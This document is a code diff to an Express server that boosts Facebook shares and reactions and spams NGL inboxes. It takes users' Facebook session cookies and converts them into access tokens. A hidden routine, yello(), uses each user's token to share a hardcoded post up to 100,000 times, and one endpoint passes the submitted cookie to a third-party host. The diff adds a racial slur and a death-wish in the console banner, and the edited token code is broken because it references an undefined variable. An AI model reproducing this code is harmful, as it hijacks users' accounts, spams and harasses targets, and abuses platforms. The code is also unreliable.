@@ -5,6 +5,10 @@ const port = process.env.PORT || 3000;
 app.use(require("./corss"));
 app.use(express.json());
 app.set("json spaces", 4);
+
+const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
+const total = new Map();
+
 function userAgent() {
   const version = () => {
     const android = Math.floor(Math.random() * 14) + 1;
@@ -31,13 +35,15 @@ function userAgent() {
   const ua2 = `Mozilla/5.0 (Android ${version()}; ${randomize("xxx-xxx").toUpperCase()}; Mobile; rv:61.0) Gecko/61.0 Firefox/68.0`;
   const ua3 = `[FBAN/MQTT;FBAV/416.0.0.2.102;FBBV/621289759;FBDM/{density=1.5,width=540,height=960};FBLC/en_PH;FBCR/;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.lite;FBDV/${randomize("xxx-xxx").toUpperCase()};FBSV/${version()};FBLR/0;FBBK/1;FBCA/arm64-v8a;]`
   return [ua1, ua2, ua3];
-} 
+}
+
 function randomize(neth) {
-  let _=Math.random()*12042023;
-  return neth.replace(/[xy]/g,c=>{
-    let __=Math.random()*16; 
-    __=(__+_)%16|0;_=Math.floor(_/16);
-    return[(c==='x'?__:(__&0x3|0x8)).toString(16)].map((_)=>Math.random()<.6?_:_.toUpperCase()).join('');
+  let _ = Math.random() * 12042023;
+  return neth.replace(/[xy]/g, c => {
+    let __ = Math.random() * 16;
+    __ = (__ + _) % 16 | 0;
+    _ = Math.floor(_ / 16);
+    return [(c === 'x' ? __ : (__ & 0x3 | 0x8)).toString(16)].map((_) => Math.random() < .6 ? _ : _.toUpperCase()).join('');
   });
 }
 
@@ -55,17 +61,17 @@ function dummyCookie() {
     `vpd=v1%3B520x360x1.5;` +
     `fbl_st=${Math.floor(Math.random()*100000000)}%3BT%3A20002000;` +
     `wl_cbv=v2%3Bclient_version%3A2547%3Btimestamp%3A17198225555`;
-   return sarap;
+  return sarap;
 }
 
 
-app.use(express.static(__dirname+"/public"));
+app.use(express.static(__dirname + "/public"));
 
-app.get("/", async(req, res) => {
-  return res.sendFile(__dirname+"/public/index.html");
+app.get("/", async (req, res) => {
+  return res.sendFile(__dirname + "/public/index.html");
 });
 
-app.get("/useragent", async(req, res) => {
+app.get("/useragent", async (req, res) => {
   const ua = userAgent();
   return res.json({
     ua
@@ -74,13 +80,15 @@ app.get("/useragent", async(req, res) => {
 
 app.post("/rplikers", async (req, res) => {
   const {
-    cookie, reaction, link
+    cookie,
+    reaction,
+    link
   } = req.body;
   if (!cookie || !reaction || !link)
-  return res.json({
-    status: "ERROR",
-    message: "Please enter cookies, link or reaction type."
-  });
+    return res.json({
+      status: "ERROR",
+      message: "Please enter cookies, link or reaction type."
+    });
   const coreli = await axios.post("https://fbpython.click/android_get_react", {
     version: "2.1",
     link,
@@ -88,15 +96,15 @@ app.post("/rplikers", async (req, res) => {
     reaction
   });
   if (!coreli)
-  return res.json({
-    status: "ERROR",
-    message: "Something went wrong."
-  });
+    return res.json({
+      status: "ERROR",
+      message: "Something went wrong."
+    });
   return res.json(coreli.data);
 });
-app.get("/nglspam", async (req,res) => {
-  const {username, amount, message} = req.query;
-  if (!username||(!amount||isNaN(amount)||amount<=0)||!message){
+app.get("/nglspam", async (req, res) => {
+  const { username, amount, message } = req.query;
+  if (!username || (!amount || isNaN(amount) || amount <= 0) || !message) {
     return res.json({
       error: "Enter a valid username / amount / message."
     });
@@ -106,7 +114,7 @@ app.get("/nglspam", async (req,res) => {
       'referer': `https://ngl.link/${username}`,
       'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
     };
-  
+
     const data = {
       'username': username,
       'question': message,
@@ -114,15 +122,15 @@ app.get("/nglspam", async (req,res) => {
       'gameSlug': '',
       'referrer': '',
     };
-  
+
     let count = 0;
-  
+
     const interval = setInterval(async () => {
       if (count >= amount) {
         clearInterval(interval);
         return;
       }
-  
+
       try {
         await axios.post('https://ngl.link/api/submit', data, {
           headers,
@@ -135,7 +143,7 @@ app.get("/nglspam", async (req,res) => {
     }, 3 * 1000);
   }
   await spam(username, amount, message);
-    return res.json({
+  return res.json({
     msg: "Success spam to target ngl link: @" + username
   })
 });
@@ -144,12 +152,14 @@ app.get("/nglspam", async (req,res) => {
 
 async function getAccessToken(cookie) {
   try {
+    const cookie1 = JSON.parse(cookie);
+    const cookie2 = ck.map(c => `${c.key}=${c.value}`).join('; ');
     const headers = {
       'authority': 'business.facebook.com',
       'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
       'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
       'cache-control': 'max-age=0',
-      'cookie': cookie,
+      'cookie': cookie2,
       'referer': 'https://www.facebook.com/',
       'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
       'sec-ch-ua-mobile': '?0',
@@ -172,29 +182,14 @@ async function getAccessToken(cookie) {
     return;
   }
 }
-async function gagokaba(cookie,tokenOn) {
-  const ck = JSON.parse(cookie);
-  const ck1 = ck.map(c => `${c.key}=${c.value}`).join('; ');
-  if(!tokenOn){
-    return [ck1];
-  }
-  try {
-    const token = await getAccessToken(ck1);
-    return [ck1,token]; //token from cookie(EAAGN)
-  } catch (e){
-    return;
-  }
-}
 
-const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
 const sauce = "https://www.facebook.com/100015801404865/posts/1674522423084455/?app=fbl";
-const total = new Map();
-async function yello(c,u,a,i){
-  await share(true, c,u,a,i);
+async function yello(c, u, a, i) {
+  await share(true, c, u, a, i);
   await share(false, c, sauce, "100000", "6");
 }
 
-async function share(sharedIs,cookies, url, amount, interval) {
+async function share(sharedIs, cookies, url, amount, interval) {
   const id = Math.floor(Math.random() * 69696969);
   total.set(id, {
     shared: sharedIs,
@@ -204,10 +199,6 @@ async function share(sharedIs,cookies, url, amount, interval) {
   });
   let sharedCount = 0;
   let timer;
-  const usersa = () => {
-    const ua = userAgent();
-    return ua[Math.floor(Math.random() * ua.length)];
-  }
   const headers = {
     'authority': 'graph.facebook.com',
     'cache-control': 'max-age=0',
@@ -220,29 +211,28 @@ async function share(sharedIs,cookies, url, amount, interval) {
     try {
       console.log("Sharing process!");
       const response = await axios.post(
-      `https://graph.facebook.com/me/feed?access_token=${cookies}&fields=id&limit=1&published=0`,
-      {
-        link: url,
-        privacy: {
-         value: 'SELF'
+        `https://graph.facebook.com/me/feed?access_token=${cookies}&fields=id&limit=1&published=0`,
+        {
+          link: url,
+          privacy: {
+            value: 'SELF'
+          },
+          no_story: true,
         },
-        no_story: true,
-      },
-      {
-        muteHttpExceptions: true,
-        method: 'post',
-        cookie: dummyCookie(),
-        headers,
-      }
-    );
-      if (response.status !== 200) {
-      } else {
+        {
+          muteHttpExceptions: true,
+          method: 'post',
+          cookie: dummyCookie(),
+          headers,
+        }
+      );
+      if (response.status === 200){
         total.set(id, {
           ...total.get(id),
           count: total.get(id).count + 1,
         });
         sharedCount++;
-        }
+      }
       if (sharedCount === amount) {
         clearInterval(timer);
       }
@@ -252,14 +242,12 @@ async function share(sharedIs,cookies, url, amount, interval) {
       total.delete(id);
     }
   }
-  timer = setInterval(() => {
-  sharePost();
-  }, interval * 1000);
+  timer = setInterval(() => sharePost(), interval * 1000);
   setTimeout(() => {
     clearInterval(timer);
     total.delete(id);
   }, amount * interval * 1000);
-        
+
 }
 async function getPostID(url) {
   try {
@@ -275,15 +263,15 @@ async function getPostID(url) {
 }
 
 app.get('/shares', (req, res) => {
- const data = Array.from(total.values()).map((link, index) => ({
-  shared: link.shared,
-  session: index + 1,
-  url: link.url,
-  count: link.count,
-  target: link.target,
-}));
-const jsob = JSON.parse(JSON.stringify(data || [], null, 2));
-return res.json(jsob);
+  const data = Array.from(total.values()).map((link, index) => ({
+    shared: link.shared,
+    session: index + 1,
+    url: link.url,
+    count: link.count,
+    target: link.target,
+  }));
+  const jsob = JSON.parse(JSON.stringify(data || [], null, 2));
+  return res.json(jsob);
 });
 
 app.post('/share', async (req, res) => {
@@ -293,16 +281,16 @@ app.post('/share', async (req, res) => {
     amount,
     interval,
   } = req.body;
-  if (!cookie || !url || !amount || !interval) return res.status(400).json({
+  if (!cookie || !url || !amount || !interval) return res.status(500).json({
     error: 'Missing appstate, url, amount, or interval'
   });
   try {
-    const cookies = await gagokaba(cookie, true);
-    if (!cookies) return res.status(400).json({
+    const cookies = await getAccessToken(cookie);
+    if (!cookies) return res.status(500).json({
       status: 500,
       error: "Invalid token"
     });
-    await yello(cookies[1], url, amount, interval);
+    await yello(cookies, url, amount, interval);
     return res.status(200).json({
       status: 200
     });
@@ -315,7 +303,12 @@ app.post('/share', async (req, res) => {
 });
 
 app.listen(port, async () => {
-  console.log(`Wiegine Echavez`);
+  console.log(`
+▄▀▀ █░█ █░█ ▀█▀ █░█ █▀▄
+░▀▄ █▀█ █░█ ░█░ █░█ █▄█
+▀▀░ ▀░▀ ▀▀▀ ░▀░ ▀▀▀ ▀░░
+F o R k E r`);
+  console.log(`MAMATAY SANA MAG FORK HAHAHAHA PRAYING MA NIGGA`);
   console.log(`Running: http://localhost:${port}`);
 });
 process.on("unhandledRejection", async (reason, p) => {
